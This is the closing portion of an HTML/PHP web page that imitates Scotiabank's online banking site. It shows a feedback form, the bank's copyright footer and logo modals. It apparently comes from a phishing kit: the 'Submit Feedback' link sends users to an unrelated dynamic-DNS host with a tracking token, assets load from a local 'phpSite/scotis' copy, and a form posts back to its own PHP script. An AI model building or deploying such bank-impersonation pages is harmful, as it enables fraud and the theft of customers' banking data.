									</div>
							</div>
							<div id="problemTab" class="RUIFW-tab-pane tab-pane fade tab-pane fade tab-pane fade">
								<div class="RUIFW-row  mrgn-top-20 row row"><div id="feedbackForm:probAreaBlock" class="RUIFW-col-6 col-sm-6 col-sm-6">
										<label>Problem area <span class="red-text">*</span></label>
										<div>
                                            <input id="feedbackForm:problemArea" type="text" name="feedbackForm:problemArea" class="RUIFW-from-el form-control probAreaLengthCheck" placeholder="e.g. Adding a Payee" maxlength="50"><span id="feedbackForm:fb_problem_area_errorId"></span>
										</div></div>
								</div>
								<div class="RUIFW-row  mrgn-top-20 row row"><div id="feedbackForm:problemDescBlock" class="RUIFW-col-7 col-sm-7 col-sm-7">
										<label id="fb_prob_descId">Problem description <span class="red-text">*</span></label>
										<div><textarea id="feedbackForm:problemDesc" name="feedbackForm:problemDesc" class="RUIFW-from-el form-control lengthCheck" cols="50" rows="6" placeholder="Explain your problem here." maxlength="400"></textarea><span id="feedbackForm:fb_Prob_errorId"></span>
										</div></div>
								</div>
									<div class="RUIFW-row  mrgn-top-20 row row"><div id="feedbackForm:pUNameBlock" class="RUIFW-col-6 col-sm-6 col-sm-6">
											<label>Your full name  <span class="form-alt-txt">(optional)</span></label>
											<div><input id="feedbackForm:pCustName" type="text" name="feedbackForm:pCustName" class="RUIFW-from-el form-control" maxlength="50"><span id="feedbackForm:fb_user_errorId"></span>
											</div></div>
									</div>
							</div>
						</div>
						<div class="RUIFW-row  mrgn-top-20 row row" id="mandatoryId">
								<div class="RUIFW-col-6 col-sm-6 col-sm-6">
								<label><span class="red-text">*</span> Mandatory field.</label></div>
						</div>
					</div>
					<div class="RUIFW-modal-footer btn-holder modal-footer modal-footer" id="aunth_sect_btns"><a id="feedbackForm:formCloseLink" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" onclick="#" class="RUIFW-btn-primary btn btn-primary btn btn-primary">Submit Feedback</a>
					</div>

</form>
			</div>
		</div>
	</div>
	
	<style>
	.error-msgPA {
    color: #D81E05;
    nowhitespace: afterproperty;
    display: inline-block!important;
    margin: 5px 0 0 20px!important;
    text-align: left!important;
    word-wrap: break-word!important;
    white-space: pre-wrap!important;
    width: 70%!important;
}
	</style><span id="leapwebanalytics">
		   		
                </span>
    </section>
</div>

  <footer class="RUIFW-page-footer">
    <div class="footer-icons" id="footerImage">
      <div class="clear"></div>
    </div>
    <div class="RUIFW-row noprint row-margin row">
    <ul class="RUIFW-nav-footer RUIFW-col-7 col-sm-7">
    <div id="footerLinks">
          <li><a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_12&quot;;return this.s_oc?this.s_oc(e):true">Legal</a></li>
          <li class="separator">&nbsp;</li>
        <li><a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_13&quot;;return this.s_oc?this.s_oc(e):true">Privacy</a></li>
        <li class="separator">&nbsp;</li>
        <li><a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_14&quot;;return this.s_oc?this.s_oc(e):true">Security</a></li>
        <li class="separator">&nbsp;</li>
        <li><a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_15&quot;;return this.s_oc?this.s_oc(e):true">Contact Us</a></li>
          <li class="separator">&nbsp;</li>
          <li><a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_16&quot;;return this.s_oc?this.s_oc(e):true">FATCA</a></li>
      </div></ul>
       <ul class=" RUIFW-nav-footer RUIFW-col-5 col-sm-5">
      <li class="copyright">
                <a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_17&quot;;return this.s_oc?this.s_oc(e):true"><img alt="trusteer" src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/trusteerIcon.png"></a>© 2022 Scotiabank.com All Rights Reserved</li>

           <li style="margin-left: 300px;">
               <div id="logo" style="display: inline;">
               </div>
           </li>

       </ul>
    </div>
   	
  </footer>
  <div id="printFooter">
    <div class="RUIFW-row row">
      <div class="RUIFW-col-12 col-sm-12">
      </div>
    </div>
    <div class="RUIFW-row row">
      <div class="RUIFW-col-9 col-sm-9">
      </div>
      <div class="RUIFW-col-3 col-sm-3">
        <img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/scotiabank_r_logo.png" width="152" height="26" class="mrgn-btm-15  mrgn-top-10 alignright">
      </div>
      </div>
  </div>
			<div class="RUIFW-modal fade modal modal fade" id="videoModal" tabindex="-1" role="dialog" aria-labelledby="videoModal" aria-hidden="true" style="display: none;">
			    <div class="RUIFW-modal-dialog modal-dialog modal-dialog modal-dialog">
			        <div class="RUIFW-modal-content modal-content modal-content modal-content" role="document">
			              <div class="RUIFW-modal-header modal-header modal-header">
			        <button type="button" class="close_icon" data-dismiss="modal"></button>
			        <h4 class="RUIFW-modal-title modal-title modal-title" id="myModalLabel"><img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/scotiabank-group.gif"></h4>
			      </div>
			            <div class="RUIFW-modal-body modal-body modal-body">
			                <div class="pad-btm-10">
				         
 			                    <iframe width="550" height="350" src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/saved_resource.html" frameborder="0"></iframe>
			                </div>
			            </div>
			        </div>
			    </div>
			</div>
<form id="j_idt321" name="j_idt321" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">



	<div class="RUIFW-modal fade modal fade" id="registerCancelPanelWindow" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" data-backdrop="static">
		
		<div class="RUIFW-modal-dialog modal-dialog modal-dialog">
			<div class="RUIFW-modal-content modal-content modal-content" role="document">
				<div class="RUIFW-modal-header modal-header">
					<button type="button" class="close_icon" data-dismiss="modal"></button>
					<h4 class="RUIFW-modal-title modal-title" id="myModalLabel">
						<img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/scotiabank-group.gif">
					</h4>
				</div>
	
</body></html>
